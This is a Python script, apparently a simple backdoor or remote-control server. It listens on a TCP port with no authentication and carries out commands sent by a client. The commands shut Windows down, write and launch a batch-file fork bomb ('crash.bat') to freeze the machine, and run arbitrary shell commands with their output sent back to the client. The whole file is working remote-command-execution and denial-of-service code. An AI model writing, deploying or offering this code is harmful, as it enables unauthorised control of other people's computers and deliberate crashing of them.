import socket
import subprocess
import os

def get_local_ip():
    """Get the local IP address of the machine."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as temp_socket:
            temp_socket.connect(('8.8.8.8', 80))
            local_ip = temp_socket.getsockname()[0]
        return local_ip
    except Exception as e:
        print(f"Error determining local IP: {e}")
        return '127.0.0.1'

def start_server(port=65432):
    host = get_local_ip()  # Get dynamic local IP
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((host, port))
        print(f"Server started on {host}:{port}")
        
        server_socket.listen(1)  # Listen for one connection at a time
        
        while True:
            print("Waiting for a new connection...")
            
            # Accept the client connection
            conn, addr = server_socket.accept()
            print(f"Connected by {addr}")
            
            with conn:
                while True:
                    try:
                        # Receive message from the client
                        data = conn.recv(1024)  # Buffer size of 1024 bytes
                        if not data:
                            # Client has disconnected
                            print(f"Client {addr} disconnected.")
                            break  # Break the inner loop to accept new connections
                        
                        # Process the message from the client
                        message = data.decode('utf-8')
                        splitUp = message.split(":")
                        
                        if splitUp[0].lower() == "shutdown":
                            print("Shutting down the system...")
                            os.system("shutdown /s")  # Shutdown command (Windows)
                            response = "System is shutting down..."
                            conn.sendall(response.encode('utf-8'))
                        
                        elif splitUp[0].lower() == "crash":
                            file_path = r"C:\Users\crash.bat"
    
                            # Check if the file exists, and if so, delete it
                            if os.path.exists(file_path):
                                os.remove(file_path)
                                print(f"Deleted existing file: {file_path}")
                            
                            # Create and write to the file
                            with open(file_path, 'w') as file:
                                file.write("@echo off \n :crash \n start \n goto crash")
                                file.close()

                            os.system("start crash.bat")
                            
                                
                            response = "Crashed"
                            conn.sendall(response.encode('utf-8'))
                        
                        elif splitUp[0].lower() == "do":
                            os.system(splitUp[1])  # Execute command (Windows)
                        elif splitUp[0].lower() == "get":
                            try:
                                response = subprocess.check_output(splitUp[1], shell=True)
                                conn.sendall(response)
                            except subprocess.CalledProcessError as e:
                                error_message = f"Command failed: {e}"
                                conn.sendall(error_message.encode('utf-8'))
                    
                    except Exception as e:
                        print(f"Error handling client {addr}: {e}")
                        break  # Break out of the inner loop to listen for new connections
                        
            print("Connection closed. Waiting for new connection...")

if __name__ == "__main__":
    start_server()
